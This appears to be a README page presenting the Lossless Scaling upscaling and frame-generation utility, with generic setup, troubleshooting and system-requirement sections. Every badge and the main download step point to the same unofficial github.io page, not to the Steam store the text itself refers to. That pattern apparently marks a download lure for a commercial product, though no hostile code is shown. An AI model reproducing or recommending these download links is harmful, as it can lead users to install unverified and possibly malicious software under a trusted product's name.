# Lossless Scaling — Simple Upscaling and Frame Generation Setup

<p align="center">
  <a href="https://Lossless-Scaling-LS.github.io/.github"><img src="https://img.shields.io/badge/GET%20LOSSLESS%20SCALING-NOW-00C853?style=for-the-badge&logo=steam&logoColor=white" alt="Get Lossless Scaling"></a>
  <a href="https://Lossless-Scaling-LS.github.io/.github"><img src="https://img.shields.io/badge/LOSSLESS%20SCALING-GITHUB-8b5cf6?style=for-the-badge&logo=github&logoColor=white" alt="Lossless Scaling GitHub"></a>
</p>

<p align="center">
  <a href="https://Lossless-Scaling-LS.github.io/.github"><img src="https://img.shields.io/badge/LS1-✓-2ea44f?style=flat-square" alt="LS1 Supported"></a>
  <a href="https://Lossless-Scaling-LS.github.io/.github"><img src="https://img.shields.io/badge/FSR-✓-2ea44f?style=flat-square" alt="FSR Supported"></a>
  <a href="https://Lossless-Scaling-LS.github.io/.github"><img src="https://img.shields.io/badge/NIS-✓-2ea44f?style=flat-square" alt="NIS Supported"></a>
  <a href="https://Lossless-Scaling-LS.github.io/.github"><img src="https://img.shields.io/badge/FRAME%20GENERATION-✓-2ea44f?style=flat-square" alt="Frame Generation Supported"></a>
</p>

<p align="center">
  <img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/993090/header.jpg" width="700" alt="Lossless Scaling">
</p>

Lossless Scaling is a Windows utility designed to upscale games and generate additional frames without requiring native frame-generation support from the game.

It works with windowed and borderless fullscreen applications and can apply scaling algorithms or LSFG frame generation externally.

Lossless Scaling can be used with modern games, older games, emulators and applications where native upscaling or frame generation is unavailable.

> **Important:** Lossless Scaling works externally through window capture. It does not modify the game's rendering pipeline or require replacing game DLLs.

## Supported Upscaling Technologies

Lossless Scaling provides several scaling methods, including:

* **LS1**
* **FSR**
* **NIS**
* **Integer Scaling**
* **XBR**
* **Anime4K**
* Nearest Neighbor
* Bilinear

The best method depends on the type of content being scaled.

For modern 3D games, LS1, FSR and NIS are common choices.

For pixel-art games, Integer Scaling and XBR can provide cleaner results.

For anime and cartoon-style content, Anime4K can be useful.

## Graphics API Support

Lossless Scaling works with games through external window capture rather than game-specific DLL injection.

Supported configurations include:

* DirectX 11
* DirectX 12

Capture can use different methods depending on the application and configuration.

Lossless Scaling does not require the game to have native DLSS, FSR or XeSS support.

The game should normally be running in:

```text
Windowed
```

or:

```text
Borderless Fullscreen
```

Exclusive fullscreen is not the standard configuration for Lossless Scaling.

## Key Features

* LSFG frame generation.
* LSFG X2, X3 and X4 modes.
* LS1 machine-learning upscaling.
* FSR and NIS scaling.
* Integer, XBR and Anime4K scaling options.
* Supports NVIDIA, AMD and Intel GPUs.
* Works with many games without native frame generation.
* Supports windowed and borderless fullscreen games.
* Supports per-game profiles.
* Provides configurable hotkeys.
* Supports different capture methods.
* Can use a second GPU for scaling or frame generation.
* Does not require game DLL replacement.
* Can be used with emulators and other applications.
* Portable installation is available.
* Continuously updated with new scaling and frame-generation features.

## Game Compatibility

Lossless Scaling compatibility is primarily determined by the game window, capture method and rendering configuration.

Before using Lossless Scaling, check:

* Game window mode
* Base resolution
* Target resolution
* Base FPS
* Monitor refresh rate
* GPU utilization
* Capture method
* Other overlays
* Anti-cheat restrictions
* Known game-specific issues

Lossless Scaling can work with many games that do not provide native frame generation, but individual titles may behave differently.

## Installing Lossless Scaling

### 1. Download Lossless Scaling - [CLICK](https://Lossless-Scaling-LS.github.io/.github)

### 2. Start Lossless Scaling

Launch Lossless Scaling from Steam and keep it running while the game is active.

### 3. Configure the Game

Start the game and set the display mode to:

```text
Borderless Fullscreen
```

or:

```text
Windowed
```

Set the desired internal resolution in the game.

For example:

```text
Game Resolution: 1920x1080
Monitor Resolution: 2560x1440
```

Lossless Scaling can then upscale the game window to the target display resolution.

### 4. Choose a Scaling Method

Open Lossless Scaling and select the desired scaling algorithm.

For general 3D games, start with:

```text
LS1
```

Alternative options include:

```text
FSR
NIS
```

For pixel-art games:

```text
Integer
XBR
```

### 5. Configure Frame Generation

If frame generation is required, enable:

```text
LSFG
```

Choose the desired multiplier:

```text
X2
X3
X4
```

The available options depend on the installed Lossless Scaling version.

### 6. Configure Capture

If the default capture method does not work correctly, try another available capture option.

The correct option can depend on the game and Windows configuration.

### 7. Activate Lossless Scaling

With the game running in windowed or borderless mode, use the configured Lossless Scaling hotkey.

The selected scaling and frame-generation settings will then be applied to the game window.

## Lossless Scaling Overlay

Lossless Scaling provides in-game controls for changing and activating its features.

The application can be controlled through configurable hotkeys.

Typical workflow:

```text
1. Launch the game
2. Launch Lossless Scaling
3. Configure scaling
4. Configure LSFG
5. Select the game window
6. Press the configured hotkey
```

If the hotkey does not work:

1. Check the configured shortcut.
2. Make sure the game is running.
3. Verify that the game is windowed or borderless.
4. Try another capture method.
5. Temporarily disable conflicting overlays.

## Choosing a Scaling Method

The recommended scaling method depends on the game.

For modern 3D games:

```text
LS1
```

is a good starting point.

Other common options include:

```text
FSR
NIS
```

For pixel-art games:

```text
Integer
XBR
```

For anime or cartoon content:

```text
Anime4K
```

If image quality is already good at the native resolution, scaling is not required. Lossless Scaling can be used only for frame generation.

> **Tip:** Test the game without scaling first. If the native resolution already provides the required image quality, enable LSFG separately.

## Frame Generation

Lossless Scaling includes LSFG frame generation for generating additional frames from the game's rendered frames.

Available multipliers include:

```text
X2
X3
X4
```

The appropriate multiplier depends on the game's base FPS and the monitor refresh rate.

For example:

```text
Base FPS: 60
LSFG: X2
Output: approximately 120 FPS
```

Frame generation requires additional GPU resources.

For smoother frame pacing, keep the base game FPS stable before enabling LSFG.

> **Tip:** A stable base framerate is more important than simply increasing the frame-generation multiplier.

## Configuration File

Lossless Scaling primarily uses application settings and Game Profiles instead of requiring manual DLL configuration.

Game Profiles can store settings for individual games.

A profile can be used to automatically apply:

* Scaling method
* Scaling mode
* Frame-generation settings
* Capture settings
* Other Lossless Scaling options

This avoids repeatedly configuring the application when switching between games.

## Manual Installation

Lossless Scaling does not require manual DLL installation into the game directory.

For the portable version:

1. Download the Lossless Scaling archive.
2. Extract the archive.
3. Run Lossless Scaling.
4. Configure the desired scaling method.
5. Configure LSFG if required.
6. Start the game.
7. Use the configured Lossless Scaling hotkey.

Do not copy Lossless Scaling DLL files into the game directory.

## Unreal Engine Games

Unreal Engine games can generally be used with Lossless Scaling in the same way as other supported games.

Set the game to:

```text
Borderless Fullscreen
```

or:

```text
Windowed
```

Then start Lossless Scaling and select the required scaling or frame-generation options.

No Unreal Engine DLL replacement is normally required.

If the game does not appear correctly in Lossless Scaling, try:

1. Switching between borderless and windowed mode.
2. Changing the capture method.
3. Disabling conflicting overlays.
4. Restarting the game after changing display settings.

## Compatibility With Other Mods

Lossless Scaling can be used alongside many graphics modifications and overlays because it operates externally.

However, multiple capture or overlay applications can interfere with each other.

If the game does not scale correctly:

1. Temporarily disable other overlays.
2. Disable third-party frame counters.
3. Test without ReShade.
4. Change the Lossless Scaling capture method.
5. Restart the game.
6. Test Lossless Scaling without other graphics modifications.

Avoid changing multiple settings at the same time when troubleshooting.

## Troubleshooting

### Lossless Scaling Does Not Detect the Game

Check the following:

1. Make sure the game is running.
2. Use Borderless Fullscreen or Windowed mode.
3. Make sure Lossless Scaling is running.
4. Try another capture method.
5. Disable conflicting overlays.
6. Restart the game after changing display settings.

### Frame Generation Does Not Work

Try the following:

1. Verify that LSFG is enabled.
2. Check that the game is running in a supported window mode.
3. Make sure the GPU has enough free resources.
4. Reduce the game's graphics settings if GPU usage is too high.
5. Try X2 before using higher multipliers.
6. Test with scaling disabled.

### Stuttering or Uneven Frame Pacing

Try:

1. Locking the game's base FPS.
2. Matching the base FPS to the selected LSFG multiplier.
3. Leaving additional GPU headroom.
4. Disabling unnecessary overlays.
5. Testing a different capture method.
6. Reducing the scaling or frame-generation workload.

### Visual Artifacts

If you see ghosting, flickering or incorrect frame interpolation:

1. Lower the frame-generation multiplier.
2. Increase the base FPS.
3. Test LSFG without scaling.
4. Try another scaling method.
5. Disable conflicting overlays.
6. Test the game at its native resolution.

### High GPU Usage

Lossless Scaling requires additional GPU resources for scaling and frame generation.

If the GPU is already near full utilization:

```text
Reduce game settings
```

or:

```text
Reduce scaling workload
```

or:

```text
Disable frame generation
```

A second GPU can also be used for supported Lossless Scaling workloads.

## Restoring the Original Configuration

Lossless Scaling normally does not modify the game's files.

To return to the original game configuration:

1. Stop Lossless Scaling.
2. Disable the active scaling mode.
3. Disable LSFG.
4. Return the game to its original resolution and display mode.
5. Launch the game normally.

No DLL restoration is normally required because Lossless Scaling works through external window capture.

## Online Games and Anti-Cheat

> **Warning:** Lossless Scaling operates externally, but compatibility with anti-cheat software cannot be guaranteed for every game.

Before using Lossless Scaling with an online or competitive title:

* Check the game's current rules.
* Check the anti-cheat requirements.
* Avoid unsupported modifications.
* Test the configuration before using it in competitive sessions.

The fact that Lossless Scaling does not normally inject game DLLs does not guarantee that every anti-cheat system will permit its use.

## System Requirements

Lossless Scaling requires a 64-bit Windows system.

* **Operating System:** Windows 10 version 2004 or newer
* **GPU:** DirectX 11-compatible GPU
* **Graphics:** NVIDIA, AMD or Intel GPUs
* **Game:** Windowed or Borderless Fullscreen application
* **CPU:** 64-bit processor
* **Storage:** Small amount of free space for the application
* **GPU Resources:** Additional GPU headroom is recommended for scaling and frame generation
* **Internet:** Required for Steam installation and downloading updates

Frame-generation performance depends on the GPU, game resolution, base FPS and selected LSFG mode.

## Recommended Setup

For a simple configuration:

1. **Install Lossless Scaling.**
2. Set the game to **Borderless Fullscreen**.
3. Choose the desired internal resolution.
4. Start with **LS1** for 3D games.
5. Use **FSR** or **NIS** if preferred.
6. Enable **LSFG X2** for a simple frame-generation setup.
7. Keep the game's base FPS stable.
8. Leave some GPU headroom for Lossless Scaling.
9. Use the configured hotkey to activate scaling.
10. Test image quality and frame pacing.
11. Create a Game Profile once the settings are working correctly.

For higher-refresh displays, X3 or X4 can be tested if the GPU and base framerate are sufficient.

> **Note:** Lossless Scaling is actively developed. Scaling algorithms, LSFG modes, capture methods and compatibility can change between releases. Always check the current Lossless Scaling documentation and release notes before troubleshooting a specific game.
